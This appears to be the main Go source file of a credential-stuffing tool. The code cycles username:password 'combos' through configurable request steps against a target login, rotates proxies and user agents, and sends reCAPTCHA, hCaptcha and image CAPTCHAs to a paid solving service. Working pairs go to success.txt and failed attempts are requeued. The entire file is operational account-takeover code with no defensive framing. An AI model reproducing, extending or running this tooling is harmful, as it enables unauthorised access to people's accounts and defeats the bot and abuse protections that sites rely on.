package main

import (
	"fmt"
	"net/url"
	"os"
	"strings"
)

type combo struct {
	id                 int
	lastWorkerId       int
	proxyIndex         int
	retryCount         int
	previousRetryCount int
	username           string
	password           string
	header             *Header
	nwp                noWebProxy
	wp                 WebProxyInterface
	wpi                WebProxyInit
	solverChan         chan<- CaptchaApiInterface
	captchaApi         CaptchaApiInterface
	currentAgent       string
	//mutex        sync.Mutex
}

//tied to combo struct
func (cmb *combo) getRequest(requestURL string, socksHTTPProxyList *[]string, webproxyList *[]string, timeout int) (string, error) {
	//get proxy using combo id
	if cmb.proxyIndex == 0 {
		//first time set it to our id
		cmb.proxyIndex = cmb.id
	}
	socksListLen := len(*socksHTTPProxyList)
	socksList := *socksHTTPProxyList
	proxyString := socksList[cmb.proxyIndex%socksListLen]
	//loop through web proxy till we get a good one.
	switch {
	case len(*webproxyList) < 2:
		cmb.nwp.init(proxyString, timeout, cmb.header, cmb.currentAgent)
		response := cmb.nwp.getRequest(requestURL, proxyString, timeout)
		/* fmt.Println("")
		fmt.Printf("%v\n", cmb.nwp.header)
		fmt.Println("") */
		//cmb.proxyIndex++
		return response, nil
	case len(*webproxyList) > 1:
		webPList := *webproxyList
		webP := webPList[cmb.proxyIndex%len(webPList)]
		//wp.Reset()
		cmb.wp = cmb.wpi.init(webP, timeout, cmb.currentAgent)
		//fmt.Println("<<<", webP)
		//cmb.proxyIndex++

		if cmb.wp.supportsPostRequest() == true {
			response := cmb.wp.getRequest(requestURL, proxyString, timeout)
			return response, nil
		}
	}
	//still here? error! increment proxyindex so we avoid this proxy for the
	//time being
	//cmb.proxyIndex++
	return "", fmt.Errorf("unknown error occorred")
}

func (cmb *combo) optionRequest(requestURL string, socksHTTPProxyList *[]string, webproxyList *[]string, timeout int) (string, error) {
	//get proxy using combo id
	if cmb.proxyIndex == 0 {
		//first time set it to our id
		cmb.proxyIndex = cmb.id
	}
	socksListLen := len(*socksHTTPProxyList)
	socksList := *socksHTTPProxyList
	proxyString := socksList[cmb.proxyIndex%socksListLen]
	//loop through web proxy till we get a good one.
	switch {
	case len(*webproxyList) < 2:
		cmb.nwp.init(proxyString, timeout, cmb.header, cmb.currentAgent)
		response := cmb.nwp.optionRequest(requestURL, proxyString, timeout)
		/* fmt.Println("")
		fmt.Printf("%v\n", cmb.nwp.header)
		fmt.Println("") */
		//cmb.proxyIndex++
		return response, nil
	case len(*webproxyList) > 1:
		webPList := *webproxyList
		webP := webPList[cmb.proxyIndex%len(webPList)]
		//wp.Reset()
		cmb.wp = cmb.wpi.init(webP, timeout, cmb.currentAgent)
		//fmt.Println("<<<", webP)
		//cmb.proxyIndex++

		if cmb.wp.supportsPostRequest() == true {
			response := cmb.wp.getRequest(requestURL, proxyString, timeout)
			return response, nil
		}
	}
	//still here? error! increment proxyindex so we avoid this proxy for the
	//time being
	//cmb.proxyIndex++
	return "", fmt.Errorf("unknown error occorred")
}

//tied to combo struct
func (cmb *combo) postRequest(requestURL string, postData string, socksHTTPProxyList *[]string, webproxyList *[]string, timeout int) (string, error) {
	//get proxy using combo id
	if cmb.proxyIndex == 0 {
		//first time set it to our id
		cmb.proxyIndex = cmb.id
	}
	socksListLen := len(*socksHTTPProxyList)
	socksList := *socksHTTPProxyList
	proxyString := socksList[cmb.proxyIndex%socksListLen]
	//loop through web proxy till we get a good one.
	switch {
	case len(*webproxyList) < 2:
		//cmb.nwp.init(proxyString, timeout)

		response := cmb.nwp.postRequest(requestURL, postData, proxyString, timeout)
		//fmt.Println(response)
		//fmt.Println("")
		//fmt.Println(postData, cmb.nwp.header.Location.RequestChain, cmb.nwp.header.CookieJar.ToString())
		//fmt.Println("")
		//cmb.proxyIndex++
		return response, nil
	case len(*webproxyList) > 1:

		//webPList := *webproxyList
		//webP := webPList[cmb.proxyIndex%len(webPList)]
		//cmb.wp = cmb.wpi.init(webP, timeout)
		//cmb.proxyIndex++
		if cmb.wp.supportsPostRequest() == true {
			//fmt.Println(cmb.wp.supportsPostRequest(), webP, "<<<<<>>>>>")
			response := cmb.wp.postRequest(requestURL, postData, proxyString, timeout)
			//fmt.Println(strings.TrimRight(response, "\n"), webP, cmb.proxyIndex)
			return response, nil
		}
	}
	//cmb.proxyIndex++
	return "", fmt.Errorf("unknown error occorred")
}

func (cmb *combo) stepper(workerId int,
	configContent string,
	socksHTTPProxyList []string,
	webproxyList []string,
	uncheckedCombos chan<- *combo,
	captchaApis *CaptchaApis,
	jsonData []step, userAgents []string) {

	//reset combo request instance
	var wp WebProxyInterface
	var wpi WebProxyInit
	var nwp noWebProxy
	var postData postBody
	var header Header
	var cookieURLBuilder, getURLBuilder, postURLBuilder StepURLBuilder
	var isGoodObj ComboOrProxyIsGood

	postData.init()
	cmb.lastWorkerId = workerId
	cmb.wp = wp
	cmb.nwp = nwp
	cmb.wpi = wpi
	cmb.currentAgent = userAgents[cmb.proxyIndex%len(userAgents)]
	header.init("", cmb.currentAgent)
	cmb.header = &header
	cookieURLBuilder.init(&header)
	getURLBuilder.init(&header)
	postURLBuilder.init(&header)
	//fmt.Println(", ----here")
	wiper := strings.Repeat(" ", len(cmb.username+cmb.password)+14)
	fmt.Printf("trying (%d.)%d %s:%s %s\n", cmb.id, cmb.retryCount+1, cmb.username, cmb.password, wiper)
	//start processing the config directives
	if len(jsonData) == 0 {
		//return we can't work with this config
		fmt.Println("Invalid Config!! exiting!!!")
		return
	}
	//still here? everything good
	//var postVariables string
	//var obtainedCookies string
	var err error
	//switch proxy
	//proxyString := ""
	timeOutSecs := 40
	var content, targetURL string
	var step step
	var proxyIsGood bool
	var continueGood bool
	var captchaGood bool
	var log Logger
	//prep url builders

	cookieURLBuilder.fromCombo(cmb).fromContent(&content)
	getURLBuilder.fromCombo(cmb).fromContent(&content)
	postURLBuilder.fromCombo(cmb).fromContent(&content)
	log.withHeader(&header).fromCombo(cmb).fromContent(&content)
	var captchaDetected bool
	var captchaSetRegex string
jsonDataLoop:
	for _, step = range jsonData {
		//probably step was just for proxy testing
		if step.Skip == true {
			continue
		}
		switch {
		case step.GetCookies != "":

			targetURL = cookieURLBuilder.resetURL().
				addURI(step.GetCookies).
				toString()

			//we need to get cookies
			//get cookies required for post here
			content, err = cmb.getRequest(
				targetURL,
				&socksHTTPProxyList,
				&webproxyList,
				timeOutSecs)
			//content = "" //we're not interested in content
			if err != nil {
				break jsonDataLoop
			}
		case step.SetCookies != "":
			//monkey patch cookie to take advantage of generator.
			header.CookieJar.Add(postData.fromCombo(cmb).extrapolateVars(step.SetCookies)) //all done.
			/* fmt.Println(cookieData.fromCombo(cmb).extrapolateVars(step.SetCookies) + "<----")
			fmt.Println(header.CookieJar.ToString())
			panic("oooh") */
		case len(step.SetHeaders) > 0:
			for _, headLine := range step.SetHeaders {
				headLine = postData.fromCombo(cmb).extrapolateVars(headLine)
				headParts := strings.Split(headLine, ": ")
				if headParts[0] == "Authorization" {
					//handle authorization differently, go removes it on
					//redirects
					upa := strings.Split(headParts[1], ":")
					header.setAuthorization(upa)

				} else {
					header.setCustomValue(headParts[0], headParts[1])
				}

			}
		case len(step.DeleteHeaders) > 0:
			for _, key := range step.DeleteHeaders {
				header.removeCustomValue(key)
			}
		case len(step.DeleteCookies) > 0:
			for _, key := range step.DeleteCookies {
				header.CookieJar.Delete(key)
			}
		case step.GetContent != "":
			targetURL = getURLBuilder.resetURL().
				addURI(step.GetContent).
				toString()
			//probably get variables needed for post data here
			regotten := false

		reget:
			content, err = cmb.getRequest(
				targetURL,
				&socksHTTPProxyList,
				&webproxyList,
				timeOutSecs)

			//fmt.Println(targetURL, content, cmb.header.CookieJar.ToString())
			//log.saveLog(content)
			if err != nil {
				fmt.Println(targetURL, err.Error())
				//stop the proxy is most likely bad
				if regotten == false {
					regotten = true
					goto reget
				}

				break jsonDataLoop
			}
			//fmt.Println(targetURL, cmb.header.CookieJar.ToString())
			//fmt.Println(targetURL, strings.Contains(content, step.ProxyGood))
			//fmt.Println(cmb.header.Location.Archive, "@#@#@#@#@#")
			//read in variables for next post request
			postData.
				fromURL(targetURL).
				fromContent(content).
				fromCombo(cmb).
				getPostVars(step.GetPostVars)

		case step.OptionContent != "":
			targetURL = getURLBuilder.resetURL().
				addURI(step.OptionContent).
				toString()
			//probably get variables needed for post data here
			regotten := false

		reoption:
			content, err = cmb.optionRequest(
				targetURL,
				&socksHTTPProxyList,
				&webproxyList,
				timeOutSecs)

			//log.saveLog(content)
			if err != nil {
				fmt.Println(targetURL, err.Error())
				//stop the proxy is most likely bad
				if regotten == false {
					regotten = true
					goto reoption
				}

				break jsonDataLoop
			}

			postData.
				fromURL(targetURL).
				fromContent(content).
				fromCombo(cmb).
				getPostVars(step.GetPostVars)
		case step.GoogleCaptchaV3Enterprise != "":
			cmb.captchaApi.isEnterprise()
			step.GoogleCaptchaV3 = step.GoogleCaptchaV3Enterprise
			fallthrough
		case step.GoogleCaptchaV3 != "":
			captchaSetRegex = step.GoogleCaptchaV3
			if strings.Contains(captchaSetRegex, "sitekey::") {
				captchaDetected = true
				keyParts := strings.Split(captchaSetRegex, "::")
				cmb.captchaApi.setSiteKey(keyParts[1])
			} else {
				captchaDetected = cmb.captchaApi.detectCaptcha("googlecaptchav3", step.GoogleCaptchaV3, &content)
			}
			if captchaDetected == true {

				cmb.captchaApi.setupGoogleRecaptchaV3(targetURL, "", 0.3)

				//now pass a pointer to tc into captcha solving channel
				cmb.solverChan <- cmb.captchaApi
				//wait till captcha submit id is set
				<-cmb.captchaApi.getSolveReturned()
				//if id is not valid break for loop to retry combo later
				if cmb.captchaApi.getCaptchaTaskId() < 10000 {
					//this is not a valid id
					break jsonDataLoop
				}
				//run poller in a goroutine
				go cmb.captchaApi.pollResult()
				//block till polling is completed
				<-cmb.captchaApi.getPollResultReturned()
				//check if error is nil then check result and use it
				if cmb.captchaApi.getError() != nil {
					fmt.Println(cmb.captchaApi.getError())
					break jsonDataLoop
				}
				if len(cmb.captchaApi.getSolution()) > 2 {
					//set extra postvar data
					postD := strings.ReplaceAll(step.AddToPostVars, "{captchaSolution}", cmb.captchaApi.getSolution())
					postData.mergeWith(postD)
					//fmt.Println(postData.toString(), ">>>>>>>>>")
					//make sure whatever happens this combo is not retried since it has consumed
					//captcha solving credit
					cmb.previousRetryCount = cmb.retryCount
					cmb.retryCount = 3
					break
				}
				//still here? break json data loop something went wrong
				break jsonDataLoop
			}
		case step.GoogleCaptchaV2Enterprise != "":
			cmb.captchaApi.isEnterprise()
			step.GoogleCaptchaV3 = step.GoogleCaptchaV2Enterprise
			fallthrough
		case step.GoogleCaptchaV2 != "":
			captchaSetRegex = step.GoogleCaptchaV2
			if strings.Contains(captchaSetRegex, "sitekey::") {
				captchaDetected = true
				keyParts := strings.Split(captchaSetRegex, "::")
				cmb.captchaApi.setSiteKey(keyParts[1])
			} else {
				captchaDetected = cmb.captchaApi.detectCaptcha("googlecaptchav2", step.GoogleCaptchaV2, &content)
			}
			if captchaDetected == true {

				cmb.captchaApi.setupGoogleRecaptchaV2(targetURL, "")

				//now pass a pointer to tc into captcha solving channel
				cmb.solverChan <- cmb.captchaApi
				//wait till captcha submit id is set
				<-cmb.captchaApi.getSolveReturned()
				//if id is not valid break for loop to retry combo later
				if cmb.captchaApi.getCaptchaTaskId() < 10000 {
					//this is not a valid id
					break jsonDataLoop
				}
				//run poller in a goroutine
				go cmb.captchaApi.pollResult()
				//block till polling is completed
				<-cmb.captchaApi.getPollResultReturned()
				//check if error is nil then check result and use it
				if cmb.captchaApi.getError() != nil {
					fmt.Println(cmb.captchaApi.getError())
					break jsonDataLoop
				}
				if len(cmb.captchaApi.getSolution()) > 2 {
					//set extra postvar data
					postD := strings.ReplaceAll(step.AddToPostVars, "{captchaSolution}", cmb.captchaApi.getSolution())
					postData.mergeWith(postD)
					//fmt.Println(postData.toString(), ">>>>>>>>>")
					//make sure whatever happens this combo is not retried since it has consumed
					//captcha solving credit
					cmb.previousRetryCount = cmb.retryCount
					cmb.retryCount = 3
					break
				}
				//still here? break json data loop something went wrong
				break jsonDataLoop
			}
			//fallthrough //is this necessary?
		case step.HCaptchaV2 != "":
			captchaSetRegex = step.HCaptchaV2
			if strings.Contains(captchaSetRegex, "sitekey::") {
				captchaDetected = true
				keyParts := strings.Split(captchaSetRegex, "::")
				cmb.captchaApi.setSiteKey(keyParts[1])
			} else {
				captchaDetected = cmb.captchaApi.detectCaptcha("hcaptchav2", step.GoogleCaptchaV2, &content)
			}
			if captchaDetected == true {
				cmb.captchaApi.setupHcaptchaV2(targetURL, "") //calling this also sets captcha type

				//now pass a pointer to tc into captcha solving channel
				cmb.solverChan <- cmb.captchaApi
				//wait till captcha submit id is set
				<-cmb.captchaApi.getSolveReturned()
				//if id is not valid break for loop to retry combo later
				if cmb.captchaApi.getCaptchaTaskId() < 10000 {
					//this is not a valid id
					break jsonDataLoop
				}
				//run poller in a goroutine
				go cmb.captchaApi.pollResult()
				//block till polling is completed
				<-cmb.captchaApi.getPollResultReturned()
				//check if error is nil then check result and use it
				if cmb.captchaApi.getError() != nil {
					fmt.Println(cmb.captchaApi.getError())
					break jsonDataLoop
				}
				if len(cmb.captchaApi.getSolution()) > 2 {
					//set extra postvar data
					postD := strings.ReplaceAll(step.AddToPostVars, "{captchaSolution}", cmb.captchaApi.getSolution())
					postData.mergeWith(postD)
					//fmt.Println(postData.toString(), ">>>>>>>>>")
					//make sure whatever happens this combo is not retried since it has consumed
					//captcha solving credit
					cmb.previousRetryCount = cmb.retryCount
					cmb.retryCount = 3
					break
				}
				//still here? break json data loop something went wrong
				break jsonDataLoop
			}

		case step.ImageCaptcha != "":
			captchaSetRegex = step.ImageCaptcha
			captchaDetected = true

			if captchaDetected == true {
				keyParts := strings.Split(captchaSetRegex, "::")
				setupString := postData.extrapolateVars(keyParts[1])
				urlEncodedSetupString := url.QueryEscape(setupString)
				switch keyParts[0] {
				case "imageUrl":
					cmb.captchaApi.setupImageCaptcha(setupString)
				case "imageB64":
					cmb.captchaApi.setupRawImageCaptcha(urlEncodedSetupString)
				}

				//now pass a pointer to tc into captcha solving channel
				cmb.solverChan <- cmb.captchaApi
				//wait till captcha submit id is set
				<-cmb.captchaApi.getSolveReturned()
				//if id is not valid break for loop to retry combo later
				if cmb.captchaApi.getCaptchaTaskId() < 10000 {
					//this is not a valid id
					break jsonDataLoop
				}
				//fmt.Printf("got captcha id: %d", cmb.captchaApi.getCaptchaTaskId())
				//run poller in a goroutine
				go cmb.captchaApi.pollResult()
				//block till polling is completed
				<-cmb.captchaApi.getPollResultReturned()
				//check if error is nil then check result and use it
				if cmb.captchaApi.getError() != nil {
					fmt.Println(cmb.captchaApi.getError())
					break jsonDataLoop
				}
				if len(cmb.captchaApi.getSolution()) > 2 {
					//set extra postvar data
					postD := strings.ReplaceAll(step.AddToPostVars, "{captchaSolution}", cmb.captchaApi.getSolution())
					postData.mergeWith(postD)
					//fmt.Println(postData.toString(), ">>>>>>>>>")
					//make sure whatever happens this combo is not retried since it has consumed
					//captcha solving credit
					cmb.previousRetryCount = cmb.retryCount
					cmb.retryCount = 3
					break
				}
				//still here? break json data loop something went wrong
				break jsonDataLoop
			}
		case step.PostFetchContent != "":
			targetURL := postURLBuilder.resetURL().
				addURI(step.PostFetchContent).
				toString()
			//fmt.Println("got here.................]]]]]]]]]]", targetURL)
			postData.mergeWith(step.PostVars)
			reposted := false
		repost:
			content, err = cmb.postRequest(
				targetURL,
				postData.toString(),
				&socksHTTPProxyList,
				&webproxyList,
				timeOutSecs)
			//fmt.Println(targetURL, postData.toString(), cmb.header.Request.KeyValue, cmb.header.CookieJar.ToString(), content)

			/* if cmb.username == "Regina4real" {
				fmt.Println(content + " " + cmb.header.responseToString())
			} */
			if err != nil {
				//stop the proxy is most likely bad
				if reposted == false {
					reposted = true
					goto repost
				}
				break jsonDataLoop
			}

			//read in variables for next post request if any
			postData.
				fromURL(targetURL).
				fromContent(content).
				fromCombo(cmb).
				getPostVars(step.GetPostVars)

		}
		//need to check that proxy is good here.
		//for all switch cases
		proxyIsGood = isGoodObj.withHeader(&header).fromCombo(cmb).fromContent(content).isGood(step.ProxyGood)
		continueGood = isGoodObj.withHeader(&header).fromCombo(cmb).fromContent(content).isGood(step.ContinueGood)
		captchaGood = isGoodObj.withHeader(&header).fromCombo(cmb).fromContent(content).isGood(step.CaptchaGood)

		if captchaGood == false {
			fmt.Printf("will requeue %s:%s because of bad captcha\n", cmb.username, cmb.password)
			cmb.retryCount = cmb.previousRetryCount //restore previous retry count cause captcha was invalid
			cmb.captchaApi.reportBad()
			//report bad captcha?
		} else if len(step.CaptchaGood) > 0 {
			cmb.captchaApi.reportGood()
		}
		if proxyIsGood == false || continueGood == false || captchaGood == false {
			break jsonDataLoop
		}
	}
	//now its time to check the result of all our steps using the last step
	comboGood := isGoodObj.withHeader(&header).fromCombo(cmb).fromContent(content).isGood(step.ComboGood)

	//fmt.Println(proxyIsGood, "!!!!!!", comboGood, cmb.username)
	switch {
	case continueGood == false:
		//actually just prevent from requeuing and print failed
		fmt.Printf("%s:%s continue bad failure %s\n", cmb.username, cmb.password, wiper)
	case proxyIsGood == true && captchaGood == true && comboGood == false:
		fmt.Printf("%s:%s failed %s\n", cmb.username, cmb.password, wiper)
		if len(os.Args) > 3 && os.Args[3] == "debug" && len(content) < 500 {
			fmt.Println(content)
		}
	case proxyIsGood == true && comboGood == true && strings.Contains(step.ComboGood, "::"):
		fmt.Println("combo found for " + cmb.username)
		//fmt.Println(cmb.nwp.Header.CookieJar.ToString(), "<<<<<<<<<<<<<<<<")
		//save combo to file.
		//fmt.Println(content)
		writeToFile("success.txt",
			fmt.Sprintf("%s::%s", cmb.username, cmb.password))
	case proxyIsGood == false:
		//fmt.Println(cmb.retryCount, "[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[", cmb.username)
		if cmb.retryCount > 2 {
			writeToFile("unchecked-combos.txt", cmb.username+"::"+cmb.password)
			break //skip rest of default case
		}
		fmt.Println("requeuing job ", cmb.username)
		cmb.retryCount++
		cmb.proxyIndex++ //only switch when retrying
		uncheckedCombos <- cmb
	default:
		//bad proxy? put combo back into queue
		fmt.Println("requeuing job without incrementing retries", cmb.username)
		uncheckedCombos <- cmb
	}
	//end of result check

}
